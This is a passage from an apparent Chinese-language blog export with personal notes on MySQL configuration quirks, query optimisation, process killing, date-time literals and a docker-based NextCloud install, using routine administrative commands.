title=\"修改大小寫方法\"></a>修改大小寫方法</h3><blockquote>\n<p>修改变量lower-case-table-names</p>\n<p>为什么会出现这个问题，主要是因为开发和测试环境不一致导致的，这也是有时测试环境完全没问题，一到生产就出诡异问题的原因之一。所以，我们除了让测试同事认真测试外，最好本地和测试环境还是一致。<br>对当前这个问题，我们直接修改SQL中的Emp为emp即可解决问题，但是为了根本解决问题，我们还须修改mysql的环境变量，也就是将lower_case_table_names的值改为0.<br>修改方法：</p>\n<ol>\n<li>找到mysql的安装位置</li>\n<li>找到主目录下的my.ini配置文件</li>\n<li>在[mysqld]节点下添加lower-case-table-names=0</li>\n<li>重启mysql服务<br>來源<a href=\"https://blog.csdn.net/postnull/article/details/72455768\" target=\"_blank\" rel=\"noopener\">MySQL表名大小写敏感导致的问题 - CSDN博客</a></li>\n</ol>\n</blockquote>\n<h2 id=\"Incorrect-integer-value-‘’-for-column-‘id’\"><a href=\"#Incorrect-integer-value-‘’-for-column-‘id’\" class=\"headerlink\" title=\"Incorrect integer value: ‘’ for column ‘id’\"></a>Incorrect integer value: ‘’ for column ‘id’</h2><p>最近事情這樣的，公司有程式做報表匯入動作<code>Incorrect integer value: &#39;&#39; for column &#39;id&#39;</code><br>經過查詢SQL語法發現，目前程式匯入某欄位剛好抓到price為空<br>導致SQL會有問題</p>\n<p>當下我以為應該不能跑<br>不過在我開發環境(window)竟然可以跑<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span>  <span class=\"string\">`test`</span>(<span class=\"keyword\">test</span> ,<span class=\"keyword\">num</span>)</span><br><span class=\"line\"> <span class=\"keyword\">values</span> ( <span class=\"string\">'fff'</span>,<span class=\"string\">''</span>);</span><br></pre></td></tr></table></figure></p>\n<p>注意<code>num</code>為int<br>開發環境竟然可以跑!!!!!</p>\n<p>更奇葩的是<code>fff</code>也能過<br><img src=\"/blog/2018/08/28/MySQL在Linux下預設有分大小寫和Incorrect-integer-value-for-column-num-問題/mysql_warning.jpg\" title=\"MySQL_Warning\"></p>\n<p>後來有找到<a href=\"https://blog.csdn.net/testcs_dn/article/details/39670421\" target=\"_blank\" rel=\"noopener\">解决Incorrect integer value: ‘’ for column ‘id’ at row 1的方法 - CSDN博客</a><br>是sql_mode有開啟<code>STRICT_TRANS_TABLES</code></p>\n<blockquote>\n<p>my.ini中查找sql-mode，默认为sql-mode=”STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”，<br>将其修改为sql-mode=”NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”，重启mysql后即可<br>參考來源:</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/testcs_dn/article/details/39670421\" target=\"_blank\" rel=\"noopener\">解决Incorrect integer value: ‘’ for column ‘id’ at row 1的方法 - CSDN博客</a></li>\n<li><a href=\"http://hello-jesson.iteye.com/blog/1569388\" target=\"_blank\" rel=\"noopener\">STRICT_TRANS_TABLES(存储引擎启用严格模式，非法数据值被拒绝)。 - Jesson - ITeye博客</a></li>\n</ul>\n</blockquote>\n<h2 id=\"結論\"><a href=\"#結論\" class=\"headerlink\" title=\"結論\"></a>結論</h2><p>用MySQL開發還是用Docker開發，不然MySQL在Window和Linux兩個環境真的差好多  囧<br>不然事後上線真的很慘，至於公司為什麼以前可以跑<br>好像上禮拜DB掛掉重裝，那台MySQL裡面sql_mode變數有設定STRICT_TRANS_TABLES<br>所以導致以前可以跑，但現在不能</p>\n<p>沒事還是不要用Windows 囧</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select @@sql_mode</span><br><span class=\"line\">-- window底下(xxamp)</span><br><span class=\"line\">-- NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</span><br><span class=\"line\">-- 公司底下(別台設定)</span><br><span class=\"line\">-- NO_ENGINE_SUBSTITUTION</span><br><span class=\"line\">-- docker 啟動mysql(不知道為什麼設定一大堆......)</span><br><span class=\"line\">-- ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION</span><br></pre></td></tr></table></figure>\n","categories":["寫程式一些事"],"tags":["MySQL"]},{"title":"MySQL抓資料設定字串欄位為索引查詢優化方法","url":"/blog/2018/05/26/MySQL%E6%8A%93%E8%B3%87%E6%96%99%E8%A8%AD%E5%AE%9A%E5%AD%97%E4%B8%B2%E6%AC%84%E4%BD%8D%E7%82%BA%E7%B4%A2%E5%BC%95%E6%9F%A5%E8%A9%A2%E5%84%AA%E5%8C%96%E6%96%B9%E6%B3%95/","content":"<p>常把搜尋條件用在索引上面<br>可以加快查詢<br>今天實驗一個東西，把uid加入到index上面<br>但是<code>explain</code>竟然還是full scan<br>index還會有掃全表的問題<br>覺得很神奇<br>就稍微研究一下<br>筆記筆記</p>\n<a id=\"more\"></a>\n<img src=\"/blog/2018/05/26/MySQL抓資料設定字串欄位為索引查詢優化方法/slow.png\" title=\"一般查詢\">\n<p>沒有用<code>*</code>查詢，竟然還會full scan<br>Google查詢一下，varchar做為index好像不太好(不確定是這個問題，相關資訊太少)</p>\n<p>就換了一下查法</p>\n<img src=\"/blog/2018/05/26/MySQL抓資料設定字串欄位為索引查詢優化方法/fast.png\" title=\"primary key,index key查詢\">\n<p>竟然就正常…</p>\n<p>那試試*看看好了…<br><img src=\"/blog/2018/05/26/MySQL抓資料設定字串欄位為索引查詢優化方法/normal.png\" title=\"primary key,index key查詢\"><br>full scan</p>\n<p>最後試試，IN優化方法(使用inner join )</p>\n<img src=\"/blog/2018/05/26/MySQL抓資料設定字串欄位為索引查詢優化方法/best.png\" title=\"primary key,index key查詢\">\n<p><strong>注意where用哪張表，select就要用另一張表</strong></p>\n<p>這樣就不會full scan了<br>愉悅!!!!</p>\n<p>參考來源：</p>\n<ul>\n<li><a href=\"http://blog.51cto.com/sucre/723808\" target=\"_blank\" rel=\"noopener\">对mysql中last_insert_id()的新理解-博客即日起停止更新-51CTO博客</a></li>\n<li><a href=\"https://blog.csdn.net/tjuyanming/article/details/77825875\" target=\"_blank\" rel=\"noopener\">[数据库与SQL] - No.5 MYSQL实现 RANK函数排序功能 - CSDN博客</a></li>\n<li><a href=\"http://www.jb51.net/article/87777.htm\" target=\"_blank\" rel=\"noopener\">Mysql row number()排序函数的用法和注意<em>Mysql</em>脚本之家</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/articles/10136053\" target=\"_blank\" rel=\"noopener\">MySQL rownum的實作與排名的方法 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a href=\"https://www.kancloud.cn/thinkphp/mysql-design-optimalize/39319\" target=\"_blank\" rel=\"noopener\">mysql的最佳索引攻略 · Mysql设计与优化专题 · 看云</a></li>\n<li><a href=\"https://blog.csdn.net/leyangjun/article/details/52846534\" target=\"_blank\" rel=\"noopener\">MySQL慢查询Explain Plan分析 - CSDN博客</a></li>\n<li><a href=\"http://www.cnblogs.com/nixi8/p/4574709.html\" target=\"_blank\" rel=\"noopener\">【mysql的设计与优化专题(6)】mysql索引攻略 - 菜问 - 博客园</a></li>\n<li><a href=\"http://database.51cto.com/art/201108/285341.htm\" target=\"_blank\" rel=\"noopener\">MySQL数据库中EXPLAIN的使用及其注意事项详解 - 51CTO.COM</a></li>\n<li><a href=\"http://www.cnblogs.com/cy163/archive/2009/05/28/1491473.html\" target=\"_blank\" rel=\"noopener\">MYSQL EXPLAIN语句的extended 选项学习体会 - cy163 - 博客园</a></li>\n</ul>\n","categories":["MySQL"],"tags":["sql","MySQL","index","MySQL優化"]},{"title":"MySQL查詢進行中程序狀況，並刪掉lock程序","url":"/blog/2018/05/17/MySQL%E6%9F%A5%E8%A9%A2%E9%80%B2%E8%A1%8C%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%8B%80%E6%B3%81%EF%BC%8C%E4%B8%A6%E5%88%AA%E6%8E%89lock%E7%A8%8B%E5%BA%8F/","content":"<p>因為網域關係，平常都是使用phpmyadmin預做設定<br>有時候下比較差的SQL，就不能執行中斷指令<br>phpmyadmin就會卡住….<br>剛好發現用cli模式登入mysql<br>可以做刪除程序<br><a id=\"more\"></a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql -h ip -u xxxx -p</span><br></pre></td></tr></table></figure>\n<p>就可以登入mysql資料庫裡面<br>只要在不打<code>;</code>下<br>無法送出指令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">show processlist;</span><br></pre></td></tr></table></figure>\n<p>可以看到是否有lock程序</p>\n<p>使用<code>kill</code>可以做刪除動作<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kill id ;</span><br></pre></td></tr></table></figure></p>\n<p>發現在不用phpmyadmin時候，cli可以中斷程序<br>phpmyadmin送出去，就<del>像變了心女朋友一樣回不來了</del>不能中斷<br>只是無法修改是一行打做的東西</p>\n<p><a href=\"http://blog.jex.tw/blog/2013/06/03/mysql-command/\" target=\"_blank\" rel=\"noopener\">MySQL 常用指令 - Jex’s Note</a><br><a href=\"http://xiangyang17spc.blogspot.tw/2008/11/mysql.html\" target=\"_blank\" rel=\"noopener\">學習備忘錄: 安裝與登入mysql</a></p>\n","categories":["MySQL"],"tags":["mysql","sql","lock"]},{"title":"MySQL浮點數運算，解決輸出到程式後面尾數有0的方法","url":"/blog/2019/03/13/MySQL%E6%B5%AE%E9%BB%9E%E6%95%B8%E9%81%8B%E7%AE%97%EF%BC%8C%E8%A7%A3%E6%B1%BA%E8%BC%B8%E5%87%BA%E5%88%B0%E7%A8%8B%E5%BC%8F%E5%BE%8C%E9%9D%A2%E5%B0%BE%E6%95%B8%E6%9C%890%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<p>最近用 MySQL 做浮點數運算<br>PHP 程式輸出竟然有<code>123.30000</code><br>後來網路上有看到解法</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>正確的解決方式：<br>select 0+cast(90.09008700 as char ) 輸出結果 90.090087<br>或者<br>select 0+CONVERT(‘90.09008700‘ , CHAR) 輸出結果：90.090087</p>\n</blockquote>\n<p>參考內容:<br><a href=\"https://www.itread01.com/content/1535301491.html\" target=\"_blank\" rel=\"noopener\">mysql 之處理金錢小數點後的多余 0 - IT 閱讀</a><br><a href=\"https://blog.csdn.net/donnie88888888/article/details/52439299\" target=\"_blank\" rel=\"noopener\">SQL 中如何去掉 decimal 字段後面的 0 - donnie88888888 的专栏 - CSDN 博客</a></p>\n","categories":["SQL"],"tags":["mysql","sql","zero"]},{"title":"MySQL轉出DB設計文件方法","url":"/blog/2019/05/09/MySQL%E8%BD%89%E5%87%BADB%E8%A8%AD%E8%A8%88%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/","content":"<p>最近專案很趕<br>今天收到要把目前所有建立的 table 用成設計書<br>雖然之前有寫過<a href=\"https://malagege.github.io/blog/2019/01/19/%E8%AE%80%E5%8F%96%E5%87%BA%E6%96%87%E4%BB%B6%E8%A8%AD%E8%A8%88%E6%9B%B8%E8%A1%A8%E6%A0%BC%E6%A0%BC%E5%BC%8F/\">從 MySQL 裡面直接(select)讀取出文件設計書表格格式 | 程式狂想筆記</a><br>但還是查一下有沒有現成，又好看的工具:P</p>\n<a id=\"more\"></a>\n<p>結果找了不多</p>\n<h2 id=\"doc-us-Laravel\"><a href=\"#doc-us-Laravel\" class=\"headerlink\" title=\"doc us(Laravel)\"></a>doc us(Laravel)</h2><p><a href=\"https://github.com/UniSharp/doc-us\" target=\"_blank\" rel=\"noopener\">GitHub - UniSharp/doc-us: A MySQL Schema Documentation Generator for Laravel.</a><br><a href=\"https://blog.unisharp.com/2017/10/31/Laravel%20%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%B9%AB%E4%BD%A0%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%20MySQL%20schema%20%E6%96%87%E4%BB%B6/\" target=\"_blank\" rel=\"noopener\">Laravel 好用工具，幫你快速生成 MySQL schema 文件 - UniSharp blog</a></p>\n<p><a href=\"https://blog.longwin.com.tw/2009/08/linux-draw-db-schema-tool-2009/\" target=\"_blank\" rel=\"noopener\">快速繪製 Db Schema(ERD) 的軟體 - DbSchema | Tsung’s Blog</a></p>\n<h2 id=\"PHPWORD\"><a href=\"#PHPWORD\" class=\"headerlink\" title=\"PHPWORD\"></a>PHPWORD</h2><p><a href=\"https://blog.hoyo.idv.tw/?p=2547\" target=\"_blank\" rel=\"noopener\">使用 PHPWord 產生 MySQL 資料庫結構文件 | hoyo 學習紀錄</a><br><a href=\"http://sandbox.onlinephpfunctions.com/code/c04fc96a535281378127cb498591c5b6136f68fb\" target=\"_blank\" rel=\"noopener\">http://sandbox.onlinephpfunctions.com/code/c04fc96a535281378127cb498591c5b6136f68fb</a></p>\n<p>有空實際用在來寫…</p>\n<p>小記在這邊(應該沒有機會寫)<br><a href=\"https://blog.longwin.com.tw/2013/08/mysql-copy-table-command-2013/\" target=\"_blank\" rel=\"noopener\">MySQL 快速複製 Table 的方法 | Tsung’s Blog</a></p>\n","categories":["實用工具"],"tags":["mysql","php","doc"]},{"title":"MySql Lock wait timeout exceeded 小記","url":"/blog/2019/09/24/MySql-Lock-wait-timeout-exceeded%E5%B0%8F%E8%A8%98/","content":"<p>今天在 log 發現有少數 SQL 會 MySql Lock wait timeout exceeded<br>網路找幾天文章，先暫時放著</p>\n<p><a href=\"https://ningyu1.github.io/blog/20180408/75-mysql-lock-wait-timeout-exceeded.html\" target=\"_blank\" rel=\"noopener\">MySql Lock wait timeout exceeded该如何处理？ | 凝雨 - Yun | 快乐编程每一天 - Happy Coding Every Days</a><br><a href=\"http://huli.logdown.com/posts/542398-high-connection-setting\" target=\"_blank\" rel=\"noopener\">[心得] 高併發伺服器設定 « Huli’s Blog</a><br><a href=\"https://benjaminwhx.com/2018/04/27/%E8%B0%88%E8%B0%88MySQL%E7%9A%84%E9%94%81/\" target=\"_blank\" rel=\"noopener\">谈谈MySQL的锁 - 蹲厕所的熊</a><br><a href=\"https://blog.scottchayaa.com/post/2019/01/09/how-to-handle-the-high-concurrency-on-laravel/\" target=\"_blank\" rel=\"noopener\">在laravel上處理高併發問題 - ScottChayaa</a></p>\n<blockquote>\n<p>mysql transaction default timeout is 50 sec =&gt; my suggestion is between 3 ~ 5 sec<br>我同事也是建議不要設長</p>\n</blockquote>\n<p><a href=\"https://blog.csdn.net/bigtree_3721/article/details/73277419\" target=\"_blank\" rel=\"noopener\">MySQL insert into … select 的锁情况 【转】 - 大树叶 技术专栏 - CSDN博客</a><br><a href=\"https://www.jianshu.com/p/4bf87a2f83ae\" target=\"_blank\" rel=\"noopener\">MySQL InnoDB 锁等待和锁等待超时的处理 - 简书</a><br><a href=\"https://medium.com/getamis/database-transaction-isolation-a1e448a7736e\" target=\"_blank\" rel=\"noopener\">資料庫交易的 Isolation - getamis - Medium</a><br><a href=\"https://medium.com/@chester.yw.chu/%E5%B0%8D%E6%96%BC-mysql-repeatable-read-isolation-%E5%B8%B8%E8%A6%8B%E7%9A%84%E4%B8%89%E5%80%8B%E8%AA%A4%E8%A7%A3-7a9afbac65af\" target=\"_blank\" rel=\"noopener\">對於 MySQL Repeatable Read Isolation 常見的三個誤解 - Chester Chu - Medium</a><br><a href=\"https://dotblogs.com.tw/rainmaker/2014/05/28/145284\" target=\"_blank\" rel=\"noopener\">[SQL]建立Index來避免DeadLock | 亂馬客 - 點部落</a><br><a href=\"http://www.xuchanggang.cn/archives/1188.html\" target=\"_blank\" rel=\"noopener\">insert into a select * from b 锁问题分析 | 没有伞的孩子必须努力奔跑</a></p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"Mysql記錄時間的那些事情","url":"/blog/2019/01/10/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/","content":"<p>常時間我們都會記錄時間<br>很常大家都會使用<code>datetime</code>來記錄<br>有時候大家也很喜歡使用<code>unixtime</code>來做時間記錄<br>到底 DB 有沒有記錄什麼<code>時間</code>方法<br>這篇只是小記</p>\n<a id=\"more\"></a>\n<p>由於我現在公司使用 unixtime 型別存在資料庫是<code>int</code><br>今天用 phpmyadmin 操作設定 ts 欄位(int10)做 default value 動做 <code>CURRENT_TIMESTAMP</code><br>竟然不能 work!!!!<br>哪尼我要做 default 不能做<br>後來看到<a href=\"https://blog.longwin.com.tw/2007/10/mysql_timestamp_properties_2007/\" target=\"_blank\" rel=\"noopener\">MySQL Timestamp 型態 的 屬性(新增/修改 自動更新 Timestamp 型態 的 欄位) | Tsung’s Blog</a><br>他是用 timestamp…，<del>等等 timestamp 不是 int 嗎…</del><br>不過我看了一下 phpmyadmin 顯示是時間的日期<br>這邊我們先來看官方文件怎麼說?</p>\n<h2 id=\"官方文件\"><a href=\"#官方文件\" class=\"headerlink\" title=\"官方文件\"></a>官方文件</h2><h3 id=\"String-and-Numeric-Literals-in-Date-and-Time-Context\"><a href=\"#String-and-Numeric-Literals-in-Date-and-Time-Context\" class=\"headerlink\" title=\"String and Numeric Literals in Date and Time Context.\"></a>String and Numeric Literals in Date and Time Context.</h3><p>MySQL recognizes DATE values in these formats:</p>\n<blockquote>\n<ul>\n<li>As a string in either ‘YYYY-MM-DD’ or ‘YY-MM-DD’ format. A “relaxed” syntax is permitted: Any punctuation character may be used as the delimiter between date parts. For example, ‘2012-12-31’, ‘2012/12/31’, ‘2012^12^31’, and ‘2012@12@31’ are equivalent.</li>\n<li>As a string with no delimiters in either ‘YYYYMMDD’ or ‘YYMMDD’ format, provided that the string makes sense as a date. For example, ‘20070523’ and ‘070523’ are interpreted as ‘2007-05-23’, but ‘071332’ is illegal (it has nonsensical month and day parts) and becomes ‘0000-00-00’.</li>\n<li>As a number in either YYYYMMDD or YYMMDD format, provided that the number makes sense as a date. For example, 19830905 and 830905 are interpreted as ‘1983-09-05’.</li>\n</ul>\n</blockquote>\n<p>簡單來說 MySQL 來看時間’2018-12-12’,’20181212’,‘2018@12@12’ MySQL 都看得懂<br>‘181212’他也會自動轉成’2018-12-12’<br>非字串數字也能轉成時間</p>\n<p>好吧大多數來講這樣寫，可能會被公司長輩打頭(逃~~)</p>\n<h3 id=\"MySQL-recognizes-DATETIME-and-TIMESTAMP-values-in-these-formats\"><a href=\"#MySQL-recognizes-DATETIME-and-TIMESTAMP-values-in-these-formats\" class=\"headerlink\" title=\"MySQL recognizes DATETIME and TIMESTAMP values in these formats:\"></a>MySQL recognizes DATETIME and TIMESTAMP values in these formats:</h3><p>MySQL recognizes DATETIME and TIMESTAMP values in these formats:</p>\n<blockquote>\n<ul>\n<li>As a string in either ‘YYYY-MM-DD HH:MM:SS’ or ‘YY-MM-DD HH:MM:SS’ format. A “relaxed” syntax is permitted here, too: Any punctuation character may be used as the delimiter between date parts or time parts. For example, ‘2012-12-31 11:30:45’, ‘2012^12^31 11+30+45’, ‘2012/12/31 11<em>30</em>45’, and ‘2012@12@31 11^30^45’ are equivalent.</li>\n<li>The only delimiter recognized between a date and time part and a fractional seconds part is the decimal point.</li>\n<li>The date and time parts can be separated by T rather than a space. For example, ‘2012-12-31 11:30:45’ ‘2012-12-31T11:30:45’ are equivalent.</li>\n<li>As a string with no delimiters in either ‘YYYYMMDDHHMMSS’ or ‘YYMMDDHHMMSS’ format, provided that the string makes sense as a date. For example, ‘20070523091528’ and ‘070523091528’ are interpreted as ‘2007-05-23 09:15:28’, but ‘071122129015’ is illegal (it has a nonsensical minute part) and becomes ‘0000-00-00 00:00:00’.</li>\n<li>As a number in either YYYYMMDDHHMMSS or YYMMDDHHMMSS format, provided that the number makes sense as a date. For example, 19830905132800 and 830905132800 are interpreted as ‘1983-09-05 13:28:00’.</li>\n</ul>\n</blockquote>\n<p>簡單來說他跟上面點都差不多，第二點在說<code>date</code>跟<code>time</code>需要用一個符號區分開(矇逼，我沒看文件還真的不知道…)<br>不知道動手玩看看就知道</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2012@12@31'</span>);</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2012-12-31'</span>);</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'20121231'</span>);</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'20021231'</span>);</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'021231'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2012@12@31 010101'</span>);</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2012-12-31G010101'</span>);</span><br></pre></td></tr></table></figure>\n<p>PS: 兩位數轉換官方文件也有寫清楚</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Year values in the range 70-99 are converted to 1970-1999.</span><br><span class=\"line\"></span><br><span class=\"line\">Year values in the range 00-69 are converted to 2000-2069.</span><br></pre></td></tr></table></figure>\n<p>官方文件</p>\n<ul>\n<li><a href=\"https://dev.mysql.com/doc/refman/8.0/en/datetime.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 11.3.1 The DATE, DATETIME, and TIMESTAMP Types</a></li>\n<li><a href=\"https://dev.mysql.com/doc/refman/8.0/en/date-and-time-literals.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 9.1.3 Date and Time Literals</a></li>\n</ul>\n<p>更詳細的 datetime 跟 timestamp 差別請看<a href=\"https://www.cnblogs.com/rangle/p/8275302.html\" target=\"_blank\" rel=\"noopener\">MySQL 案例之 Timestamp 和 Datetime - Rangle - 博客园</a> </p>\n<p>我過去看過型別</p>\n<ul>\n<li>datetime</li>\n<li>timestamp</li>\n<li>int</li>\n<li>varchar</li>\n</ul>\n<p>int 是現在公司用的<br>varchar 事前一間公司用的，聽說很舊系統都這樣用，聽說好移轉 XD</p>\n<h2 id=\"使用-unixtime-要注意的大小事-時區問題\"><a href=\"#使用-unixtime-要注意的大小事-時區問題\" class=\"headerlink\" title=\"使用 unixtime 要注意的大小事 - 時區問題\"></a>使用 unixtime 要注意的大小事 - 時區問題</h2><p>如裡面有做備份說明<a href=\"https://www.cnblogs.com/rangle/p/8275302.html\" target=\"_blank\" rel=\"noopener\">MySQL 案例之 Timestamp 和 Datetime - Rangle - 博客园</a></p>\n<p>不過我看一些紀錄都不建議用 timestamp 做紀錄<br>詳細如下</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/2934258/how-do-i-get-the-current-time-zone-of-mysql\" target=\"_blank\" rel=\"noopener\">timezone - How do I get the current time zone of MySQL? - Stack Overflow</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/questions/10186779\" target=\"_blank\" rel=\"noopener\">Mysql 的問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a href=\"https://codeday.me/bug/20170619/28746.html\" target=\"_blank\" rel=\"noopener\">MySQL 的时区是否应该设置为 UTC？ - 代码日志</a></li>\n<li><a href=\"https://codeday.me/bug/20171201/103722.html\" target=\"_blank\" rel=\"noopener\">如何在 MySQL 中存储 datetime 与时区信息 - 代码日志</a></li>\n<li><a href=\"https://ask.csdn.net/questions/711972\" target=\"_blank\" rel=\"noopener\">sql-我应该在 MySQL 中使用 datetime 还是 timestamp 数据类型？——CSDN 问答频道</a></li>\n</ul>\n<p>推估應該要以程式端為主控制(?!，目前自己猜測的…)</p>\n<p>先記錄到這邊</p>\n<p>題外話<br>想起之前想寫一篇 timezone format 筆記<br>但都沒有抽出時間寫<code>2014-12-01T12:00:00Z</code><br><a href=\"https://www.youtube.com/watch?v=DDu78WvmpB0\" target=\"_blank\" rel=\"noopener\">[ Alex 宅幹嘛 ] 👨‍💻moment.js 日期時間管理資源庫入門導讀 - YouTube</a><br>有時間來時做一個來玩玩看<br>另外瀏覽器的時間格式是<code>2118-01-01</code><br>剛好發現…html 的 input type 屬性<code>datetime</code>屬性廢棄掉了<br><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/datetime\" target=\"_blank\" rel=\"noopener\"><input type=\"datetime\"> | MDN</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/datetime-local\" target=\"_blank\" rel=\"noopener\"><input type=\"datetime-local\"> | MDN</a><br>他的格式是<code>2018-06-12T19:30</code><br>前端最近流行這個格式???</p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"NextCloud 使用docker簡易安裝筆記","url":"/blog/2018/09/16/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/","content":"<p>NextCloud 使用docker簡易安裝筆記</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker  run  -d  -p  8000:80   nextcloud</span><br></pre></td></tr></table></figure>\n<p>就可以簡單使用NextCloud</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker  run -d  -v  /mnt/HD1/nextcloud_bk:/var/www/html -p  8000:80 nextcloud</span><br></pre></td></tr></table></figure>\n<p>當然要備份資料可以掛載，我有試著掛載<code>~/data/owncolud.db</code>好像沒有作用<br>在想應該還有其他設定檔</p>\n<p>它還有很特別功能，竟然有檔案版本控制<br>我沒玩過NAS，不知道是不是這是NAS基本功能<br><img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/01.png\"></p>\n<p>家裡有一台Raspberry PI，它被用來當動物機，常常追番用的<br>平常傳資料我都是在window開hfs去傳的，有時候覺得跑來跑去很麻煩<br>還在想它可以怎麼跟Raspbery PI用</p>\n<h2 id=\"elementary-OS-client設定\"><a href=\"#elementary-OS-client設定\" class=\"headerlink\" title=\"elementary OS client設定\"></a>elementary OS client設定</h2><img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/1.png\">\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:nextcloud-devs/client</span><br><span class=\"line\">sudo apt-get update</span><br></pre></td></tr></table></figure>\n<p>這樣就能安裝 nextcloud-client<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install nextcloud-client</span><br></pre></td></tr></table></figure></p>\n<img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/2.png\">\n<img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/3.png\">\n<img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/4.png\" title=\"沒有申請憑證，當然要點第2個選項\">\n<p>可惜…，當天講者電腦icon有同步圖示，elementary OS好像看不到QQ</p>\n<p>後來安裝nautilus跟nautilus-nextcloud，然後登入再登入之後就能看到nautilus有圖示功能了<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install nautilus nautilus-nextcloud</span><br></pre></td></tr></table></figure></p>\n<p>原生elementary os 檔案管理工具沒有套件….<br><img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/files_icons.png\"></p>\n<p>找個播放器來試試</p>\n<h2 id=\"安裝audio-player\"><a href=\"#安裝audio-player\" class=\"headerlink\" title=\"安裝audio player\"></a>安裝audio player</h2><p>可用上面搜尋快速找到你要的套件<br><img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/001.png\"></p>\n<img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/002.png\" title=\"這邊不能用localhost連線，要用127.0.0.1(本機的話)\">\n<img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/003.png\">\n<img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/004.png\">\n<img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/005.png\">\n<img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/006.png\">\n<img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/007.png\">\n<p>別對搜尋中按鈕騙了…，害我等了快30分鐘…(我還以為壞掉了)<br><em>請記得要點「搜尋中」他才會真的搜尋!!!</em></p>\n<p>後來還發現還有markdown套件!!!</p>\n<h1 id=\"假如區網可能會遇到非安全網域的問題\"><a href=\"#假如區網可能會遇到非安全網域的問題\" class=\"headerlink\" title=\"假如區網可能會遇到非安全網域的問題\"></a>假如區網可能會遇到非安全網域的問題</h1><p>假如你有root權限，直接做volumes資料夾那邊設定<br>沒的話要<code>docker exec -ti xxxx bash</code>進去改</p>\n<p>我沒看文件，加入 <code>1 =&gt; &#39;*&#39;,</code><br>竟然能跑XD<br>有對外開放IP，不建議這樣設定<br>指定比較安全</p>\n<img src=\"/blog/2018/09/16/NextCloud-使用docker簡易安裝筆記/config.png\">\n<p>參考來源:<br><a href=\"http://bit.ly/sakana20180915\" target=\"_blank\" rel=\"noopener\">講者簡報</a><br><a href=\"http://sakananote2.blogspot.com/\" target=\"_blank\" rel=\"noopener\">講者blog</a><br><a 